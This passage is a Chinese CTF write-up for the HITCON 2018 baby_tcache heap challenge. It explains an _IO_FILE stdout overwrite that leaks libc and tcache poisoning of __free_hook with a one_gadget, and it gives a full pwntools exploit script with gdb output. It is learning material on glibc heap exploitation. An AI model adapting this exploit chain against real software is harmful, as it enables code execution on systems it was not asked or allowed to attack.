                                                    // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写
                 f->_IO_write_ptr - f->_IO_write_base);
这里我们将_IO_write_base最低覆盖成0了，所以他大部分情况下比_IO_write_ptr小，所以to_do的大小就变成相对可控了
在逆向回去就是flag检查
    #define _IO_NO_WRITES 0x0008
    #define _IO_CURRENTLY_PUTTING 0x0800
    #define _IO_IS_APPENDING 0x1000
    _flags = 0xfbad0000 //高两个字节是magic不用管
    _flags & = _IO_NO_WRITES = 0
    _flags & _IO_CURRENTLY_PUTTING = 1
    _flags & _IO_IS_APPENDING = 1
    所以_flag的值为0x0xfbad18*0  *可以为任何数
其实魔数部分改成什么都可以
原理讲通后就是测试了
    struct _IO_FILE {
      int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
    #define _IO_file_flags _flags
      /* The following pointers correspond to the C++ streambuf protocol. */
      /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
      char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
      char* _IO_write_base; /* Start of put area. */
      char* _IO_write_ptr;  /* Current put pointer. */
      char* _IO_write_end;  /* End of put area. */
      char* _IO_buf_base;   /* Start of reserve area. */
      char* _IO_buf_end;    /* End of reserve area. */
      /* The following fields are used to support backing up and undo. */
      char *_IO_save_base; /* Pointer to start of non-current get area. */
      char *_IO_backup_base;  /* Pointer to first valid character of backup area */
      char *_IO_save_end; /* Pointer to end of non-current get area. */
      struct _IO_marker *_markers;
      struct _IO_FILE *_chain;
      int _fileno;
    #if 0
      int _blksize;
    #else
      int _flags2;
    #endif
      _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */
    #define __HAVE_COLUMN /* temporary */
      /* 1+column number of pbase(); 0 is unknown. */
      unsigned short _cur_column;
      signed char _vtable_offset;
      char _shortbuf[1];
      /*  char* _save_gptr;  char* _save_egptr; */
      _IO_lock_t *_lock;
    #ifdef _IO_USE_OLD_IO_FILE
    };
这里就是覆盖_IO_FILE的结构体了，fbad1800是flags，fbad是魔数，  
后面接下来三个p64(0)覆盖
    char* _IO_read_ptr;   /* Current read pointer */
      char* _IO_read_end;   /* End of get area. */
      char* _IO_read_base;  /* Start of putback+get area. */
最后覆盖一个低字节\x00到_IO_write_base，效果如下
    gdb-peda$ x/20gx 0x7f00898f0760
    0x7f00898f0760 :   0x00000000fbad1800  0x0000000000000000
    0x7f00898f0770 :    0x0000000000000000  0x0000000000000000
    0x7f00898f0780 :    0x00007f00898f0700  0x00007f00898f07e3
    0x7f00898f0790 :    0x00007f00898f07e3  0x00007f00898f07e3
    0x7f00898f07a0 :    0x00007f00898f07e4  0x0000000000000000
    0x7f00898f07b0 :    0x0000000000000000  0x0000000000000000
    0x7f00898f07c0 :    0x0000000000000000  0x00007f00898efa00
    0x7f00898f07d0 :   0x0000000000000001  0xffffffffffffffff
    0x7f00898f07e0 :   0x000000000a000000  0x00007f00898f18c0
    0x7f00898f07f0 :   0xffffffffffffffff  0x0000000000000000
    gdb-peda$ x/10gx 0x00007f00898f0700
    0x7f00898f0700 :   0x0000000000000000  0x00007f00898f18b0
    0x7f00898f0710 :   0xffffffffffffffff  0x0000000000000000
    0x7f00898f0720 :   0x00007f00898ef780  0x0000000000000000
    0x7f00898f0730 :   0x0000000000000000  0x0000000000000000
    0x7f00898f0740 :   0x0000000000000000  0x0000000000000000
所以可以泄露出libc地址了
#### tcache poisoning攻击
    new(0xa0, p64(libc_base + libc.symbols['__free_hook']))
        new(0x60, "A")
        #gdb.attach(io)
        #one_gadget = 0x4f2c5 #
        one_gadget = 0x4f322 #0x10a38c
        new(0x60, p64(libc_base + one_gadget))
        delete(0)
### exp
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    elf = ELF('./baby_tcache')
    libc = elf.libc
    io = process('./baby_tcache')
    context.log_level = 'debug'
    def choice(idx):
        io.sendlineafter("Your choice: ", str(idx))
    def new(size, content='a'):
        choice(1)
        io.sendlineafter("Size:", str(size))
        io.sendafter('Data:', content)
    def delete(idx):
        choice(2)
        io.sendlineafter("Index:", str(idx))
    def exit():
        choice(3)
    def exp():
        new(0x500-0x8) #0
        new(0x30) #1
        new(0x40) #2
        new(0x50) #3
        new(0x60) #4
        new(0x500-0x8) #5
        new(0x70) #6
        delete(4)
        new(0x68, "A"*0x60 + '\x60\x06')
        delete(2)
        delete(0)
        delete(5)
        new(0x530)
        delete(4)
        new(0xa0, '\x60\x07')
        new(0x40, 'a')
        new(0x3e, p64(0xfbad1800)+ p64(0)*3 + '\x00')
        print(repr(io.recv(8)))
        print('leak!!!!!')
        info1 = io.recv(8)
        print(repr(info1))
        leak_libc = u64(info1)
        io.success("leak_libc: 0x%x" % leak_libc)
        libc_base = leak_libc - 0x3ed8b0
        new(0xa0, p64(libc_base + libc.symbols['__free_hook']))
        new(0x60, "A")
        #gdb.attach(io)
        #one_gadget = 0x4f2c5 #
        one_gadget = 0x4f322 #0x10a38c
        new(0x60, p64(libc_base + one_gadget))
        delete(0)
    if __name__ == '__main__':
        while True:
            try:
                exp()
                io.interactive()
                break
            except Exception as e:
                io.close()
                io = process('./baby_tcache')
### 调试总结
这些都是自己调试出来的经验，所以个人技巧，不喜欢可以不用
#### 查看内存部分
想gdb调试查看这部分内存的话  
new(0x3e, p64(0xfbad1800)+ p64(0)*3 + '\x00')，  
不要在之后下断，之后查看的话看不到  
可以在这句话之前下断
    b malloc
    finish
    n
n有好多步，自己测试，这里可以一直按回车，gdb会默认上一条命令，记得查看那时候内存就行x/20gx stdout
#### gdb附加技巧
这道题需要爆破，所以附加的不好很麻烦，我是加了个死循环，然后gdb.attach(io)，想要中断的时候在运行exp代码那个终端ctrl+c中断后在关闭gdb附加窗口
#### 计算技巧
以前我经常用python计算offset，现在都是用gdb命令p addr1-addr2
## 总结
  1. IO_FILE攻击还是nb,能利用基本函数泄露出libc
  2. 自己构造起overlap起来还是有点吃力，以后要多练习这部分内容
## 参考链接
[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)  
[IO-FILE部分源码分析及利用](http://dittozzz.top/2019/04/24/IO-FILE部分源码分析及利用/)  
[2018-hitcon-baby-tcache_writeup](http://pollux.cc/2019/05/03/2018-hitcon-baby-tcache/)